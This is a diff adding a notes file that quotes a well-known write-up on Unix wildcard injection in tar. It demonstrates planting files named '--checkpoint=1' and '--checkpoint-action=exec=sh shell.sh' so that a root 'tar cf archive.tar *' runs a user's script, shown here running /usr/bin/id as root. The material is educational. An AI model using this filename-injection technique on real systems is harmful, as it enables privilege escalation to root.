@@ -1,0 +1,77 @@
+https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+https://www.slideshare.net/FaresEmir/old-school-hacking-exploiting-unix-wildcards
+
+===[ Tar arbitrary command execution ]==
+
+Previous example is nice example of file ownership hijacking. Now, let's go to even 
+more interesting stuff like arbitrary command execution. Tar is very common unix program 
+for creating and extracting archives.
+Common usage for lets say creating archives is:
+
+[root@defensecode public]# tar cvvf archive.tar *
+
+So, what's the problem with 'tar'? 
+Thing is that tar has many options, and among them, there some pretty interesting
+options from arbitrary parameter injection point of view.
+
+Let's check tar manual page (man tar):
+
+      --checkpoint[=NUMBER]
+              display progress messages every NUMBERth record (default 10)
+
+       --checkpoint-action=ACTION
+              execute ACTION on each checkpoint
+
+There is '--checkpoint-action' option, that will specify program which will
+be executed when checkpoint is reached. Basically, that allows us arbitrary
+command execution.
+
+Check the following directory:
+
+[root@defensecode public]# ls -al
+total 72
+drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
+drwx------. 24 user user  4096 Oct 28 18:32 ..
+-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
+-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
+-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
+-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
+-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
+-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
+-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
+-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
+-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
+-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
+-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
+-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
+-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
+
+Now, for example, root user wants to create archive of all files in current 
+directory.
+
+[root@defensecode public]# tar cf archive.tar *
+
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command
+execution under root privileges.
+Once again, there are few files created by user 'leon'. 
+
+-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
+-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
+-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
+
+Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 
+'tar' program as command line options. Basically, they command tar to execute shell.sh
+shell script upon the execution.
+
+[root@defensecode public]# cat shell.sh
+/usr/bin/id
+
+So, with this tar argument pollution, we can basically execute arbitrary commands 
+with privileges of the user that runs tar. As demonstrated on the 'root' account above.
